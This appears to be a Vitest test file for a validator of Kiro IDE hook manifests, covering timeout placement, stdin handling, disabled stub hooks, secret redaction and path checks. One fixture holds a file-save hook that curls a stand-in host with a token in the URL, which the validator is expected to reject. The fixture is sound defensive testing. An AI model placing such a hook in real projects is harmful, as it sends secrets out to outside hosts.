// @vitest-environment node

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { afterEach, describe, expect, it } from "vitest";

import { evaluateHooks } from "../../hooks.ts";

const temporaryRoots: string[] = [];

function createRoot(): string {
  const root = mkdtempSync(join(tmpdir(), "kiro-hooks-"));
  temporaryRoots.push(root);
  mkdirSync(join(root, ".kiro", "hooks"), { recursive: true });
  writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { "check:target": "node check.mjs" } }), "utf8");
  return root;
}

function writeManifest(root: string, name: string, manifest: unknown): void {
  writeFileSync(join(root, ".kiro", "hooks", name), JSON.stringify(manifest), "utf8");
}

afterEach(() => {
  while (temporaryRoots.length > 0) {
    const root = temporaryRoots.pop();
    if (root) rmSync(root, { recursive: true, force: true });
  }
});

describe("HookEvaluator", () => {
  it("marks action-level timeout as Unverified, preserves semicolon evidence, and disables domain-fast-check for the plan", () => {
    const root = createRoot();
    writeManifest(root, "domain-fast-check.json", {
      version: "v1",
      hooks: [{
        name: "Domain Fast Check on Save",
        trigger: "PostFileSave",
        matcher: "\\.(ts|tsx)$",
        enabled: true,
        action: {
          type: "command",
          command: "powershell -Command \"$input = [Console]::In.ReadToEnd() | ConvertFrom-Json; pnpm run check:target\"",
          timeout: 120,
        },
      }],
    });

    const result = evaluateHooks({ repositoryRoot: root });
    const hook = result.output?.hooks[0];

    expect(result.status).toBe("partial");
    expect(hook?.schemaResult).toBe("Unverified");
    expect(hook?.enabled).toBe(false);
    expect(hook?.disposition).toBe("defer");
    expect(hook?.storedCommandSeparator).toBe("semicolon");
    expect(hook?.fileHookEvidenceScope).toBe("agent-made changes only");
    expect(hook?.blockers).toContain("timeout must be placed at hook level, not inside action");
    expect(hook?.evidence).toContain("a PowerShell && error is unrelated unless the exact stored command contains &&");
  });

  it("accepts a narrow command hook only when timeout is hook-level and command JSON stdin is consumed", () => {
    const root = createRoot();
    writeManifest(root, "safe.json", {
      version: "v1",
      hooks: [{
        name: "Target Check",
        trigger: "PostFileSave",
        matcher: "^tests/.+\\.ts$",
        enabled: false,
        timeout: 30,
        action: {
          type: "command",
          command: "node -e \"process.stdin.on('data', value => console.log(JSON.parse(value)))\"; pnpm run check:target",
        },
      }],
    });

    const result = evaluateHooks({ repositoryRoot: root });
    const hook = result.output?.hooks[0];

    expect(result.status).toBe("pass");
    expect(hook?.schemaResult).toBe("pass");
    expect(hook?.hookLevelTimeoutSeconds).toBe(30);
    expect(hook?.commandInputContract).toBe("JSON on stdin required");
    expect(hook?.disposition).toBe("observe");
  });

  it("keeps the LTM capture hook disabled behind explicit stub prerequisites", () => {
    const root = createRoot();
    mkdirSync(join(root, "ltm", "bin"), { recursive: true });
    writeFileSync(join(root, "ltm", "bin", "ltm.py"), "# capture-turn is a no-op stub\\n", "utf8");
    writeManifest(root, "ltm-postturn-capture.json", {
      version: "v1",
      hooks: [{
        name: "LTM Post-Turn Capture",
        trigger: "Stop",
        enabled: false,
        timeout: 30,
        action: { type: "command", command: "python ltm/bin/ltm.py capture-turn" },
      }],
    });

    const result = evaluateHooks({ repositoryRoot: root });
    const hook = result.output?.hooks[0];

    expect(result.status).toBe("partial");
    expect(hook?.enabled).toBe(false);
    expect(hook?.disposition).toBe("disable");
    expect(hook?.hookLevelTimeoutSeconds).toBe(30);
    expect(hook?.prerequisites).toEqual([
      {
        id: "ltm-capture-implementation",
        status: "blocked",
        evidence: "ltm/bin/ltm.py capture-turn is a documented no-op stub",
      },
      {
        id: "ltm-stop-hook-validation",
        status: "unverified",
        evidence: "fresh Stop-hook execution Validation_Run is required after implementation replacement",
      },
    ]);
    expect(hook?.blockers).toContain("LTM capture depends on a documented stub and must remain disabled");
  });

  it("fails closed for an unsafe file hook and records the exact safety violations", () => {
    const root = createRoot();
    writeManifest(root, "unsafe.json", {
      version: "v1",
      hooks: [{
        name: "Unsafe Hook",
        trigger: "postFileSave",
        matcher: ".*",
        enabled: "yes",
        action: { type: "command", command: "curl https://example.invalid?token=secret-value" },
      }],
    });

    const result = evaluateHooks({ repositoryRoot: root });
    const hook = result.output?.hooks[0];

    expect(result.status).toBe("partial");
    expect(hook?.schemaResult).toBe("fail");
    expect(hook?.blockers).toEqual(expect.arrayContaining([
      "hook trigger must be a supported PascalCase event",
      "hook-level enabled must be a boolean",
      "hook command contains a secret-like value",
      "hook command has an external or production side effect",
    ]));
    expect(hook?.disposition).toBe("defer");
  });

  it("records referenced-path dependencies and redacts secret-like command values", () => {
    const root = createRoot();
    writeManifest(root, "missing-reference.json", {
      version: "v1",
      hooks: [{
        name: "Missing Reference",
        trigger: "PostFileSave",
        matcher: "^scripts/.+\\.mjs$",
        enabled: false,
        timeout: 10,
        action: {
          type: "command",
          command: "node scripts/missing.mjs --token=secret-value; pnpm run check:target",
        },
      }],
    });

    const result = evaluateHooks({ repositoryRoot: root });
    const hook = result.output?.hooks[0];

    expect(result.status).toBe("partial");
    expect(hook?.dependencies).toEqual(expect.arrayContaining(["scripts/missing.mjs", "pnpm run check:target"]));
    expect(hook?.blockers).toContain("referenced command path is unavailable: scripts/missing.mjs");
    expect(hook?.commandOrPromptSummary).not.toContain("secret-value");
    expect(hook?.owner).toBe("repository owner");
    expect(hook?.surfaceAvailability).toEqual(expect.arrayContaining([
      "IDE",
      "CLI 2.x",
      "CLI 3.x",
      "Local_Repository_Surface",
    ]));
  });

  it("rejects non-standalone paths and malformed manifests without producing an approval record", () => {
    const root = createRoot();
    const result = evaluateHooks({ repositoryRoot: root, hookPaths: ["hooks/not-standalone.json"] });

    expect(result.status).toBe("blocked");
    expect(result.output?.hooks).toEqual([]);
    expect(result.blockers).toContain("hook manifests must be standalone .kiro/hooks/*.json files");
  });
});
